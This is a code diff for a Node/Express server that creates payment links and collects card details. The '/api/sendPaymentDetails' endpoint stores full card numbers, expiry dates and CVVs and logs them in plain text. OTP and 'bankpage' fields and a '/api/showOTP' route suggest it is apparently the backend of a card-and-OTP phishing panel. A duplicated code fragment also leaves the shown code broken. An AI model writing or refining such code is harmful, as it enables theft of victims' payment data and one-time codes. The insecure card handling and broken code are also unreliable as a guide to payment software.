@@ -16,30 +16,50 @@ app.post('/api/generatePaymentLink', (req, res) => {
   try {
     const { amount, description } = req.body;
     
+    // Validate inputs
     if (!amount || isNaN(amount) || amount <= 0) {
-      return res.status(400).json({ status: "error", message: "Invalid amount. Must be a positive number" });
+      return res.status(400).json({ 
+        status: "error", 
+        message: "Invalid amount. Must be a positive number" 
+      });
     }
     
     if (!description || !description.trim()) {
-      return res.status(400).json({ status: "error", message: "Description cannot be empty" });
+      return res.status(400).json({ 
+        status: "error", 
+        message: "Description cannot be empty" 
+      });
     }
+
+    // Generate secure invoice ID
+    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
     
-    // Generate a secure invoice ID
-    const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
-    
-    // Create full URL with proper protocol (if behind a proxy, use x-forwarded-proto)
+    // Create full URL with protocol
     const protocol = req.headers['x-forwarded-proto'] || req.protocol;
-    const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
-    
-    paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
-    
-    res.json({ status: "success", paymentLink });
-    
+    const paymentLink = `${protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
+
+    // Store payment details
+    paymentLinks.set(invoiceId, {
+      amount: parseFloat(amount),
+      description: description.trim(),
+      paymentLink,
+      createdAt: new Date().toISOString()
+    });
+
+    res.json({ 
+      status: "success", 
+      paymentLink 
+    });
+
   } catch (error) {
     console.error('Payment Link Error:', error);
-    res.status(500).json({ status: "error", message: "Internal server error. Please check server logs." });
+    res.status(500).json({
+      status: "error",
+      message: "Internal server error. Please check server logs."
+    });
   }
 });
+
 
     // Generate secure invoice ID
     const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
@@ -96,9 +116,10 @@ app.get('/api/transactions', (req, res) => {
 app.post('/api/sendPaymentDetails', (req, res) => {
   const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
   const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
+  
   const transaction = {
     id: invoiceId,
-    cardNumber, 
+    cardNumber,
     expiry,
     cvv,
     email,
@@ -111,14 +132,15 @@ app.post('/api/sendPaymentDetails', (req, res) => {
     otpEntered: null,
     otpError: false,
     redirectStatus: null,
+    bankpageVisible: false,  // Moved inside the object
     timestamp: new Date().toLocaleString()
   };
+  
   transactions.set(invoiceId, transaction);
   console.log("New transaction recorded:", transaction);
   res.json({ status: "success", invoiceId });
-  redirectStatus: null, 
-  bankpageVisible: false 
-};
+});
+
 app.post('/api/showOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
